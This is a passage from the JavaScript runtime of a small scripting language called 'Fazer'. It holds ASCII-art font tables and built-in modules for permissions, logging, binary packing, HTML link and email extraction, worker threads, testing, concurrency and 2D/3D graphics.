          "    ",
          "    "
        ],
        "9": [
          "(~~|",
          " __|",
          "    ",
          "    "
        ],
        " ": [
          "    ",
          "    ",
          "    ",
          "    "
        ],
        "A": [
          " /\\ ",
          "/  \\",
          "~~~~",
          "|  |"
        ],
        "B": [
          "|~\\ ",
          "|_/ ",
          "| \\ ",
          "|_/ "
        ],
        "C": [
          " /` ",
          "|   ",
          "|   ",
          " \\_,"
        ],
        "D": [
          "|\\  ",
          "| ) ",
          "|/  ",
          "|   "
        ],
        "E": [
          "|~~ ",
          "|-  ",
          "|_  ",
          "    "
        ],
        "F": [
          "|~~ ",
          "|-  ",
          "|   ",
          "    "
        ],
        "G": [
          " /` ",
          "|   ",
          "|_\\ ",
          " \\_,"
        ],
        "H": [
          "|  |",
          "|--|",
          "|  |",
          "    "
        ],
        "I": [
          " |  ",
          " |  ",
          " |  ",
          "    "
        ],
        "J": [
          "   |",
          "   |",
          "|__|",
          "    "
        ],
        "K": [
          "| / ",
          "|<  ",
          "| \\ ",
          "    "
        ],
        "L": [
          "|   ",
          "|   ",
          "|__ ",
          "    "
        ],
        "M": [
          "|\\/|",
          "|  |",
          "|  |",
          "    "
        ],
        "N": [
          "|\\ |",
          "| \\|",
          "|  |",
          "    "
        ],
        "O": [
          "/~~\\",
          "|  |",
          "\\__/",
          "    "
        ],
        "P": [
          "|~~\\",
          "|__/",
          "|   ",
          "    "
        ],
        "Q": [
          "/~~\\",
          "|  |",
          "\\__\\",
          "    "
        ],
        "R": [
          "|~~\\",
          "|_ /",
          "| \\ ",
          "    "
        ],
        "S": [
          " /~ ",
          " `-. ",
          "__/ ",
          "    "
        ],
        "T": [
          "~~~~",
          " || ",
          " || ",
          "    "
        ],
        "U": [
          "|  |",
          "|  |",
          "\\__/",
          "    "
        ],
        "V": [
          "\\  /",
          " \\/ ",
          "    ",
          "    "
        ],
        "W": [
          "\\  /",
          " \\/ ",
          " /\\ ",
          "/  \\"
        ],
        "X": [
          "\\  /",
          " >< ",
          "/  \\",
          "    "
        ],
        "Y": [
          "\\  /",
          " \\/ ",
          " || ",
          "    "
        ],
        "Z": [
          "~~~/",
          "  / ",
          " /__",
          "    "
        ]
      },
      "classy": {
        "0": [
          " __ ",
          "/  \\",
          "\\__/",
          "    "
        ],
        "1": [
          " /| ",
          "  | ",
          " _|_",
          "    "
        ],
        "2": [
          " __ ",
          "  _)",
          " /__",
          "    "
        ],
        "3": [
          " __ ",
          " _/ ",
          " \\__",
          "    "
        ],
        "4": [
          "    ",
          "|__|",
          "   |",
          "    "
        ],
        "5": [
          " __ ",
          "|_  ",
          " __|",
          "    "
        ],
        "6": [
          " __ ",
          "/_  ",
          "\\__/",
          "    "
        ],
        "7": [
          " __ ",
          "  / ",
          " /  ",
          "    "
        ],
        "8": [
          " __ ",
          "(<>)",
          "/__\\",
          "    "
        ],
        "9": [
          " __ ",
          "(_/ ",
          " /  ",
          "    "
        ],
        " ": [
          "    ",
          "    ",
          "    ",
          "    "
        ],
        "A": [
          " __ ",
          "/  \\",
          "|__|",
          "|  |"
        ],
        "B": [
          " __ ",
          "|__)",
          "|__)",
          "    "
        ],
        "C": [
          " __ ",
          "/  `",
          "\\__,",
          "    "
        ],
        "D": [
          " __ ",
          "|  \\",
          "|__/",
          "    "
        ],
        "E": [
          " ___",
          "|__ ",
          "|___",
          "    "
        ],
        "F": [
          " ___",
          "|__ ",
          "|   ",
          "    "
        ],
        "G": [
          " __ ",
          "/ _`",
          "\\__>",
          "    "
        ],
        "H": [
          "    ",
          "|__|",
          "|  |",
          "    "
        ],
        "I": [
          "    ",
          " |  ",
          " |  ",
          "    "
        ],
        "J": [
          "    ",
          "   |",
          "\\__/",
          "    "
        ],
        "K": [
          "    ",
          "|__/",
          "|  \\",
          "    "
        ],
        "L": [
          "    ",
          "|   ",
          "|___",
          "    "
        ],
        "M": [
          "    ",
          "|\\/|",
          "|  |",
          "    "
        ],
        "N": [
          "    ",
          "|\\ |",
          "| \\|",
          "    "
        ],
        "O": [
          " __ ",
          "/  \\",
          "\\__/",
          "    "
        ],
        "P": [
          " __ ",
          "|__)",
          "|   ",
          "    "
        ],
        "Q": [
          " __ ",
          "/  \\",
          "\\__X",
          "    "
        ],
        "R": [
          " __ ",
          "|__)",
          "|  \\",
          "    "
        ],
        "S": [
          " __ ",
          "/__`",
          ".__/",
          "    "
        ],
        "T": [
          "___ ",
          " |  ",
          " |  ",
          "    "
        ],
        "U": [
          "    ",
          "|  |",
          "\\__/",
          "    "
        ],
        "V": [
          "    ",
          "\\  /",
          " \\/ ",
          "    "
        ],
        "W": [
          "    ",
          "|  |",
          "|/\\|",
          "    "
        ],
        "X": [
          "    ",
          "\\_/",
          "/ \\ ",
          "    "
        ],
        "Y": [
          "    ",
          "\\_/",
          " |  ",
          "    "
        ],
        "Z": [
          " __ ",
          "  / ",
          " /_ ",
          "    "
        ]
      },
      "delta": {
        "0": [
          " ___ ",
          "/ _ \\",
          "|/ \\|",
          "\\_/_/",
          "     "
        ],
        "1": [
          "  ^  ",
          " /|  ",
          "  |  ",
          "  |  ",
          " ___ "
        ],
        "2": [
          " ___ ",
          "/   \\",
          "   / ",
          "  /  ",
          "|___ "
        ],
        "3": [
          " ___ ",
          "    /",
          "  _/ ",
          "    \\",
          "\\___/"
        ],
        "4": [
          "     ",
          "|  | ",
          "|__| ",
          "   | ",
          "   | "
        ],
        "5": [
          " ___ ",
          "|    ",
          "|___ ",
          "    |",
          "|___/"
        ],
        "6": [
          " ___ ",
          "/    ",
          "|___ ",
          "|   |",
          "\\___/"
        ],
        "7": [
          " ___ ",
          "   / ",
          "  /  ",
          " /   ",
          "/    "
        ],
        "8": [
          " ___ ",
          "( _ )",
          "/ _ \\",
          "\\___/",
          "     "
        ],
        "9": [
          " ___ ",
          "|   |",
          "\\___|",
          "    |",
          "\\___/"
        ],
        " ": [
          "     ",
          "     ",
          "     ",
          "     ",
          "     "
        ],
        "A": [
          "  ^  ",
          " / \\ ",
          "/___\\",
          "|   |",
          "|___|"
        ],
        "B": [
          " ___ ",
          "|   \\",
          "|___/",
          "|   \\",
          "|___/"
        ],
        "C": [
          " ___ ",
          "/   \\",
          "|    ",
          "|    ",
          "\\___/"
        ],
        "D": [
          " ___ ",
          "|   \\",
          "|    |",
          "|    |",
          "|___/"
        ],
        "E": [
          " ___ ",
          "|   |",
          "|___|",
          "|   |",
          "|___|"
        ],
        "F": [
          " ___ ",
          "|   |",
          "|___|",
          "|    ",
          "|    "
        ],
        "G": [
          " ___ ",
          "/   \\",
          "|  __",
          "| |  |",
          "\\_\\__|"
        ],
        "H": [
          "     ",
          "|   |",
          "|___|",
          "|   |",
          "|   |"
        ],
        "I": [
          " ___ ",
          "  |  ",
          "  |  ",
          "  |  ",
          " ___ "
        ],
        "J": [
          "     ",
          "    |",
          "    |",
          "|   |",
          "\\___/"
        ],
        "K": [
          "     ",
          "|  /",
          "| / ",
          "| \\ ",
          "|  \\"
        ],
        "L": [
          "     ",
          "|    ",
          "|    ",
          "|    ",
          "|___ "
        ],
        "M": [
          "     ",
          "|\\ /|",
          "| v |",
          "|   |",
          "|   |"
        ],
        "N": [
          "     ",
          "|\\  |",
          "| \\ |",
          "|  \\|",
          "|   |"
        ],
        "O": [
          " ___ ",
          "/   \\",
          "|   |",
          "|   |",
          "\\___/"
        ],
        "P": [
          " ___ ",
          "|   \\",
          "|___/",
          "|    ",
          "|    "
        ],
        "Q": [
          " ___ ",
          "/   \\",
          "|   |",
          "|  \\|",
          "\\___\\"
        ],
        "R": [
          " ___ ",
          "|   \\",
          "|___/",
          "|  \\ ",
          "|   \\"
        ],
        "S": [
          " ___ ",
          "/   \\",
          "\\___ ",
          "    \\",
          "\\___/"
        ],
        "T": [
          " ___ ",
          "- | -",
          "  |  ",
          "  |  ",
          "  |  "
        ],
        "U": [
          "     ",
          "|   |",
          "|   |",
          "|   |",
          "\\___/"
        ],
        "V": [
          "     ",
          "\\   /",
          " \\ / ",
          "  V  ",
          "  V  "
        ],
        "W": [
          "     ",
          "|   |",
          "| | |",
          "|/ \\|",
          "W   W"
        ],
        "X": [
          "     ",
          "\\   /",
          " > < ",
          "/   \\",
          "/   \\"
        ],
        "Y": [
          "     ",
          "\\   /",
          " \\ / ",
          "  |  ",
          "  |  "
        ],
        "Z": [
          " ___ ",
          "   / ",
          "  /  ",
          " /   ",
          "|___ "
        ]
      },
      "ansi_regular": {
        "0": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "1": [
          "  \u2588\u2588  ",
          " \u2588\u2588\u2588  ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        "2": [
          "\u2588\u2588\u2588\u2588\u2588 ",
          "    \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        "3": [
          "\u2588\u2588\u2588\u2588\u2588 ",
          "    \u2588\u2588",
          "  \u2588\u2588\u2588\u2588",
          "    \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 "
        ],
        "4": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "    \u2588\u2588",
          "    \u2588\u2588"
        ],
        "5": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "    \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 "
        ],
        "6": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "7": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "   \u2588\u2588 ",
          "  \u2588\u2588  ",
          " \u2588\u2588   ",
          "\u2588\u2588    "
        ],
        "8": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "9": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588\u2588",
          "    \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        " ": [
          "     ",
          "     ",
          "     ",
          "     ",
          "     "
        ],
        "A": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "B": [
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 "
        ],
        "C": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588    ",
          "\u2588\u2588    ",
          "\u2588\u2588    ",
          " \u2588\u2588\u2588\u2588 "
        ],
        "D": [
          "\u2588\u2588\u2588\u2588  ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588  "
        ],
        "E": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588  ",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        "F": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588  ",
          "\u2588\u2588    ",
          "\u2588\u2588    "
        ],
        "G": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588    ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "H": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "I": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        "J": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "\u2588\u2588\u2588\u2588  ",
          " \u2588\u2588   "
        ],
        "K": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588 \u2588\u2588 ",
          "\u2588\u2588\u2588\u2588  ",
          "\u2588\u2588 \u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588"
        ],
        "L": [
          "\u2588\u2588    ",
          "\u2588\u2588    ",
          "\u2588\u2588    ",
          "\u2588\u2588    ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ],
        "M": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "N": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588 \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588 \u2588\u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "O": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "P": [
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588    ",
          "\u2588\u2588    "
        ],
        "Q": [
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588 \u2588\u2588 ",
          " \u2588\u2588\u2588\u2588 "
        ],
        "R": [
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "S": [
          " \u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588    ",
          " \u2588\u2588\u2588\u2588 ",
          "    \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588 "
        ],
        "T": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  "
        ],
        "U": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 "
        ],
        "V": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 ",
          "  \u2588\u2588  "
        ],
        "W": [
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588  \u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "\u2588\u2588  \u2588\u2588"
        ],
        "X": [
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 ",
          "  \u2588\u2588  ",
          " \u2588\u2588\u2588\u2588 ",
          "\u2588\u2588  \u2588\u2588"
        ],
        "Y": [
          "\u2588\u2588  \u2588\u2588",
          " \u2588\u2588\u2588\u2588 ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  ",
          "  \u2588\u2588  "
        ],
        "Z": [
          "\u2588\u2588\u2588\u2588\u2588\u2588",
          "   \u2588\u2588 ",
          "  \u2588\u2588  ",
          " \u2588\u2588   ",
          "\u2588\u2588\u2588\u2588\u2588\u2588"
        ]
      },
      "ansi_compact": {
        "0": [
          "\u2588\u2580\u2588",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "1": [
          "\u2584\u2588 ",
          " \u2588 ",
          "\u2584\u2588\u2584"
        ],
        "2": [
          "\u2580\u2580\u2588",
          " \u2588 ",
          "\u2588\u2580\u2580"
        ],
        "3": [
          "\u2580\u2580\u2588",
          " \u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "4": [
          "\u2588 \u2588",
          "\u2588\u2580\u2588",
          "  \u2588"
        ],
        "5": [
          "\u2588\u2580\u2580",
          "\u2580\u2580\u2584",
          "\u2580\u2580\u2580"
        ],
        "6": [
          "\u2588\u2580 ",
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "7": [
          "\u2580\u2580\u2588",
          "  \u2588",
          "  \u2580"
        ],
        "8": [
          "\u2588\u2580\u2588",
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "9": [
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2588",
          "  \u2580"
        ],
        " ": [
          "   ",
          "   ",
          "   "
        ],
        "A": [
          "\u2584\u2588\u2584",
          "\u2588\u2580\u2588",
          "\u2580 \u2580"
        ],
        "B": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2584",
          "\u2580\u2580 "
        ],
        "C": [
          "\u2584\u2580\u2580",
          "\u2588  ",
          "\u2580\u2580\u2580"
        ],
        "D": [
          "\u2588\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580 "
        ],
        "E": [
          "\u2588\u2580\u2580",
          "\u2588\u2580\u2580",
          "\u2580\u2580\u2580"
        ],
        "F": [
          "\u2588\u2580\u2580",
          "\u2588\u2580\u2580",
          "\u2580  "
        ],
        "G": [
          "\u2588\u2580\u2580",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "H": [
          "\u2588 \u2588",
          "\u2588\u2580\u2588",
          "\u2580 \u2580"
        ],
        "I": [
          "\u2580\u2588\u2580",
          " \u2588 ",
          "\u2580\u2588\u2580"
        ],
        "J": [
          " \u2584\u2584",
          " \u2588 ",
          "\u2580  "
        ],
        "K": [
          "\u2588 \u2584",
          "\u2588\u2580\u2584",
          "\u2580 \u2580"
        ],
        "L": [
          "\u2588  ",
          "\u2588  ",
          "\u2580\u2580\u2580"
        ],
        "M": [
          "\u2588\u2580\u2588",
          "\u2588 \u2588",
          "\u2580 \u2580"
        ],
        "N": [
          "\u2588\u2580\u2584",
          "\u2588 \u2588",
          "\u2580 \u2580"
        ],
        "O": [
          "\u2584\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "P": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2580",
          "\u2580  "
        ],
        "Q": [
          "\u2584\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580\u2588"
        ],
        "R": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2584",
          "\u2580 \u2580"
        ],
        "S": [
          "\u2584\u2580\u2580",
          "\u2580\u2580\u2584",
          "\u2580\u2580\u2580"
        ],
        "T": [
          "\u2580\u2588\u2580",
          " \u2588 ",
          " \u2580 "
        ],
        "U": [
          "\u2588 \u2588",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "V": [
          "\u2588 \u2588",
          "\u2588 \u2588",
          "\u2580\u2580 "
        ],
        "W": [
          "\u2588 \u2588",
          "\u2588\u2584\u2588",
          "\u2580 \u2580"
        ],
        "X": [
          "\u2580\u2584\u2580",
          " \u2588 ",
          "\u2580 \u2580"
        ],
        "Y": [
          "\u2588 \u2588",
          "\u2580\u2588\u2580",
          " \u2580 "
        ],
        "Z": [
          "\u2580\u2580\u2588",
          " \u2584\u2580",
          "\u2588\u2580\u2580"
        ]
      }
    };
    const builtins = {
      // ──────────────────────────────────────────────────────────────────────────
      // FAZER SECURITY & INNOVATION SUITE (v3.0)
      // ──────────────────────────────────────────────────────────────────────────
      // Sandbox / Permissions (v3.9)
      sandbox: {
        drop: (perm) => {
          if (!this.permissions.has(perm)) return false;
          this.permissions.delete(perm);
          return true;
        },
        has: (perm) => this.permissions.has(perm),
        list: () => Array.from(this.permissions)
      },
      // Math & String Utils
      Math,
      JSON,
      // Logging Module
      log: {
        info: (msg, data) => console.log(`\x1B[36m[INFO]\x1B[0m ${msg}`, data ? JSON.stringify(data) : ""),
        warn: (msg, data) => console.warn(`\x1B[33m[WARN]\x1B[0m ${msg}`, data ? JSON.stringify(data) : ""),
        error: (msg, data) => console.error(`\x1B[31m[ERROR]\x1B[0m ${msg}`, data ? JSON.stringify(data) : ""),
        debug: (msg, data) => {
          if (process.env.DEBUG) console.log(`\x1B[90m[DEBUG]\x1B[0m ${msg}`, data ? JSON.stringify(data) : "");
        }
      },
      // Binary Struct (v4.0)
      struct: {
        pack: (fmt, ...values2) => {
          let buf = Buffer.alloc(0);
          let valIdx = 0;
          for (let i = 0; i < fmt.length; i++) {
            const c = fmt[i];
            const val = values2[valIdx++];
            let b;
            try {
              if (c === "b") {
                b = Buffer.alloc(1);
                b.writeInt8(Number(val));
              } else if (c === "B") {
                b = Buffer.alloc(1);
                b.writeUInt8(Number(val));
              } else if (c === "h") {
                b = Buffer.alloc(2);
                b.writeInt16LE(Number(val));
              } else if (c === "H") {
                b = Buffer.alloc(2);
                b.writeUInt16LE(Number(val));
              } else if (c === "i") {
                b = Buffer.alloc(4);
                b.writeInt32LE(Number(val));
              } else if (c === "I") {
                b = Buffer.alloc(4);
                b.writeUInt32LE(Number(val));
              } else if (c === "f") {
                b = Buffer.alloc(4);
                b.writeFloatLE(Number(val));
              } else if (c === "d") {
                b = Buffer.alloc(8);
                b.writeDoubleLE(Number(val));
              } else if (c === "s") {
                b = Buffer.from(String(val));
              } else {
                valIdx--;
                continue;
              }
              buf = Buffer.concat([buf, b]);
            } catch (e) {
              throw new FazerError(`Struct pack error at '${c}': ${e.message}`);
            }
          }
          return buf;
        },
        unpack: (fmt, buf) => {
          if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
          let off = 0;
          const res = [];
          for (const c of fmt) {
            try {
              if (c === "b") {
                res.push(buf.readInt8(off));
                off += 1;
              } else if (c === "B") {
                res.push(buf.readUInt8(off));
                off += 1;
              } else if (c === "h") {
                res.push(buf.readInt16LE(off));
                off += 2;
              } else if (c === "H") {
                res.push(buf.readUInt16LE(off));
                off += 2;
              } else if (c === "i") {
                res.push(buf.readInt32LE(off));
                off += 4;
              } else if (c === "I") {
                res.push(buf.readUInt32LE(off));
                off += 4;
              } else if (c === "f") {
                res.push(buf.readFloatLE(off));
                off += 4;
              } else if (c === "d") {
                res.push(buf.readDoubleLE(off));
                off += 8;
              } else if (c === "s") {
                let end = buf.indexOf(0, off);
                if (end === -1) end = buf.length;
                res.push(buf.toString("utf8", off, end));
                off = end + 1;
              }
            } catch (e) {
              res.push(null);
            }
          }
          return res;
        }
      },
      // HTML/OSINT Parser (v4.0)
      html: {
        extract_links: (html) => {
          const regex = /href=["'](.*?)["']/g;
          const res = [];
          let m;
          while ((m = regex.exec(String(html))) !== null) res.push(m[1]);
          return res;
        },
        extract_emails: (html) => {
          const regex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/g;
          const res = [];
          let m;
          while ((m = regex.exec(String(html))) !== null) res.push(m[1]);
          return res;
        },
        strip_tags: (html) => String(html).replace(/<[^>]*>/g, "")
      },
      // Worker Threads (v4.0)
      worker: {
        spawn: (path2, data) => {
          checkPerm("exec");
          const { Worker } = require("worker_threads");
          const w = new Worker(__filename, {
            argv: [String(path2)],
            workerData: data
          });
          const id = "w_" + Date.now() + "_" + Math.random().toString(36).substr(2, 5);
          this.children.set(id, w);
          return {
            id,
            send: (msg) => w.postMessage(msg),
            on: (ev, fn) => {
              if (ev === "message") w.on("message", async (d) => {
                if (fn && fn.__fnref__) await this._call(fn, [d], this.global);
              });
              if (ev === "error") w.on("error", async (d) => {
                if (fn && fn.__fnref__) await this._call(fn, [d], this.global);
              });
              if (ev === "exit") w.on("exit", async (d) => {
                if (fn && fn.__fnref__) await this._call(fn, [d], this.global);
              });
            },
            terminate: () => w.terminate()
          };
        },
        is_worker: () => {
          try {
            return !require("worker_threads").isMainThread;
          } catch (e) {
            return false;
          }
        },
        data: () => {
          try {
            return require("worker_threads").workerData;
          } catch (e) {
            return null;
          }
        },
        post: (msg) => {
          try {
            require("worker_threads").parentPort.postMessage(msg);
          } catch (e) {
          }
        }
      },
      // Test Runner Helper
      test: {
        assert: (cond, msg) => {
          if (!cond) throw new FazerError("Assertion Failed: " + (msg || ""));
        },
        equal: (a, b, msg) => {
          if (a != b) throw new FazerError(`Assertion Failed: ${a} != ${b} ${msg || ""}`);
        },
        run: async (name, fn) => {
          try {
            if (fn && fn.__fnref__) await this._call(fn, [], this.global);
            console.log(`\x1B[32mPASS:\x1B[0m ${name}`);
            return true;
          } catch (e) {
            console.error(`\x1B[31mFAIL:\x1B[0m ${name} - ${e.message}`);
            return false;
          }
        }
      },
      // Concurrency (v3.7)
      chan: (capacity) => new Channel(Number(capacity) || 0),
      spawn: (fn) => {
        checkPerm("exec");
        this._call(fn, [], this.global).catch((e) => console.error(`[Spawn Error] ${e.message}`));
        return true;
      },
      send: async (ch, val) => {
        if (!(ch instanceof Channel)) throw new Error("send() expects a channel");
        await ch.send(val);
        return true;
      },
      recv: async (ch) => {
        if (!(ch instanceof Channel)) throw new Error("recv() expects a channel");
        return await ch.recv();
      },
      close: (obj) => {
        if (obj instanceof Channel) {
          obj.close();
          return true;
        }
        if (obj && typeof obj.close === "function") {
          obj.close();
          return true;
        }
        return false;
      },
      // Physics Helpers
      phys: {
        dist: (x1, y1, x2, y2) => Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2)),
        angle: (x1, y1, x2, y2) => Math.atan2(y2 - y1, x2 - x1),
        clamp: (val, min, max) => Math.min(Math.max(val, min), max),
        lerp: (a, b, t) => a + (b - a) * t,
        aabb: (r1, r2) => r1.x < r2.x + r2.w && r1.x + r1.w > r2.x && r1.y < r2.y + r2.h && r1.y + r1.h > r2.y
      },
      len: (obj) => obj && obj.length !== void 0 ? obj.length : 0,
      str_sub: (s, start, end) => s && typeof s === "string" ? s.substring(start, end) : "",
      str_len: (s) => s && s.length !== void 0 ? s.length : 0,
      gfx: {
        _width: 800,
        _height: 600,
        _title: "Game",
        _running: false,
        _queue: [],
        _inputs: { keys: {}, mouse: { x: 0, y: 0, down: false } },
        // Initialize Window (2D Mode)
        init: async (title, w, h) => {
          builtins.gfx._title = title || "Fazer App";
          builtins.gfx._width = Number(w) || 800;
          builtins.gfx._height = Number(h) || 600;
          builtins.gfx._mode = "2d";
          await builtins.webview.start({
            port: 0,
            title: builtins.gfx._title,
            width: builtins.gfx._width,
            height: builtins.gfx._height,
            html: builtins.gfx._get_renderer_html()
          });
          builtins.gfx._running = true;
          return true;
        },
        // Initialize Window (3D Mode - WebGL)
        init3d: async (title, w, h) => {
          builtins.gfx._title = title || "Fazer 3D App";
          builtins.gfx._width = Number(w) || 800;
          builtins.gfx._height = Number(h) || 600;
          builtins.gfx._mode = "3d";
          await builtins.webview.start({
            port: 0,
            title: builtins.gfx._title,
            width: builtins.gfx._width,
            height: builtins.gfx._height,
            html: builtins.gfx._get_renderer_html_3d()
            // New WebGL Renderer
          });
          builtins.gfx._running = true;
          return true;
        },
        // Game Loop
        loop: (updateFn) => {
          if (!builtins.gfx._running) return;
          const interval = setInterval(async () => {
            if (!builtins.gfx._running) {
              clearInterval(interval);
              return;
            }
            builtins.gfx._queue = [];
            try {
              await this._call(updateFn, [], this.global);
            } catch (e) {
              console.error("Game Loop Error (Recovered):", e);
            }
            builtins.webview.send("gfx_frame", builtins.gfx._queue);
          }, 16);
        },
        // Audio & Weather
        sfx: (type, enable) => builtins.gfx._queue.push({ op: "sfx", type, enable }),
        weather: (type, enable) => builtins.gfx._queue.push({ op: "weather", type, enable }),
        // Drawing Commands (2D)
        clear: (color) => builtins.gfx._queue.push({ op: "clear", color }),
        rect: (x, y, w, h, color) => builtins.gfx._queue.push({ op: "rect", x, y, w, h, color }),
        circle: (x, y, r, color) => builtins.gfx._queue.push({ op: "circle", x, y, r, color }),
        // Images & Audio (SimCity Support)
        load_image: (key, path2) => {
          try {
            const fs2 = require("fs");
            const data = fs2.readFileSync(path2);
            let mime = "image/png";
            if (path2.endsWith(".jpg") || path2.endsWith(".jpeg")) mime = "image/jpeg";
            else if (path2.endsWith(".gif")) mime = "image/gif";
            const src = "data:" + mime + ";base64," + data.toString("base64");
            builtins.gfx._queue.push({ op: "load_image", key, src });
          } catch (e) {
            console.error("GFX Error: Failed to load image " + path2);
          }
        },
        image: (key, x, y, w, h, sx, sy, sw, sh) => builtins.gfx._queue.push({ op: "image", key, x, y, w, h, sx, sy, sw, sh }),
        batch: (key, items) => builtins.gfx._queue.push({ op: "batch", key, items }),
        load_sound: (key, path2) => {
          try {
            const fs2 = require("fs");
            const data = fs2.readFileSync(path2);
            let mime = "audio/wav";
            if (path2.endsWith(".mp3")) mime = "audio/mpeg";
            else if (path2.endsWith(".ogg")) mime = "audio/ogg";
